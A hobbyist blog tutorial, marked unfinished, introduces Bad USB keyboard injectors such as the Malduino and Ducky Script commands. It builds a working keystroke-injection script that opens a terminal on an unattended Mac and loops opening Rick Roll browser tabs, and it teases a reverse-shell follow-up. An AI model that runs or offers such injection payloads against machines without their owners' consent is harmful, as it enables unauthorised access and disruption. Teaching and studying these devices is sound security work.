---
title: "Introduction to Keyboard Injectors with Rick Astley (UNFINISHED)"
date: 2020-02-11
tags: [Advanced Projects, Bash]
header:
  image: "images/maltronix.jpg"
excerpt: "Use a Malduino to launch a Rick Roll bomb on an unattended computer"
---



# DISCLAIMER:
Code in this project utilizes your browser for purposes it was not intended for and could potentially damage computer hardware if used excessively. Do not plug a bad USB into any computer without the proper permissions from its owner.


## Bad USBs:
Computers, printers, external drives, scanners, and cameras, they all have one thing in common, a Universal Serial Bus(USB) socket. conveniently, nearly every one of these devices has no security measures in place to prevent harmful devices from being plugged in, the operating system essentially allows the USB to do whatever it wants because anti-virus software cannot access the software on a USB. A "Bad USB" is a USB drive with the microcontroller's firmware reprogrammed in such a way that allows it to be used for malicious purposes.


## Keyboard Injectors
A Keyboard injector is a Bad USB programmed to initiate keystrokes at superhuman speeds once plugged in.

![Keyboard-Injector](/images/injector.gif){:class="img-responsive"}

One such device is the [Malduino](https://maltronics.com/collections/malduinos) by Maltronics. As the name suggests the Malduino is a "bad" Arduino setup using [Arduino's IDE](https://www.arduino.cc/en/main/software).

The Malduino Elite has 4 switches corresponding to binary values 1 and 0. Depending on the switch combination a particular script stored on the micro sd card will execute. I.g. 1010.txt for gaining a reverse shell and 1110.txt for DNS poisoning.  
![malduino](/images/malduino_img.jpg){:class="img-responsive"}
## Ducky Script Basics
The Malduino uses a scripting language called ducky script (lines are executed successively).
### DELAY
DELAY adds a pause in milliseconds to the script. This is useful if you want to give a process time to finish before executing the next line. The following is a delay of 1 second:
```
DELAY 1000
```
### STRING and ENTER
STRING is used to simulate characters typed on the keyboard. For example, 
```
STRING Hello!
```
would simulate the user typing "Hello!" on the keyboard. 
ENTER emulates the enter key.
```
STRING Hello!
ENTER
```
This will become useful once you need to navigate cmd/terminal or a built in search such as Spotlight.
### GUI
GUI simulates the Super key(Mac: command Windows: Windows key). With this you gain access to various keyboard shortcuts.
```
GUI r
STRING cmd
ENTER
```
This script uses the Windows-key+r shortcut to pull up the Windows' “Run” box, type out cmd, and hit enter.
## The Script:
Firstly, access a shell/cmd using the methods mentioned above. For mac, access spotlight then navigate to the terminal with the proper delay times (tweak delays so script runs as fast as possible). 
```
DELAY 2000
GUI space
DELAY 500
STRING terminal
DELAY 500
ENTER
```
Next access a bash shell (in case bash isn't the default shell) so we can quickly write out the browser bomb script
*The delays are too long. Make sure to tweak them for efficiency*
```
DELAY 500
STRING bash
DELAY 500
ENTER
```
Create an index variable and a while loop that uses -le (less than) to decide how many browsers to open. For now I'm using 5 meaning 5 browsers will open. 
```
STRING N=0
DELAY 500
ENTER
DELAY 500
STRING while [ $N -le 5 ]; do
DELAY 500
ENTER
```
*Use to run an infinite loop*

```
STRING while: do
```
Use **open** to open a browser with the specified link. With Windows, open internet explorer then enter the link.
Lastly, add to the index variable and end the while loop.
```
DELAY 500
STRING open https://www.youtube.com/watch?v=dQw4w9WgXcQ
DELAY 500
ENTER
DELAY 500
STRING N=$(( $N + 1 ))
DELAY 500
ENTER
DELAY 500
STRING done
DELAY 500
ENTER
DELAY 500
```
### Next
Check out gaining a reverse shell on any unattended computer with Malduino
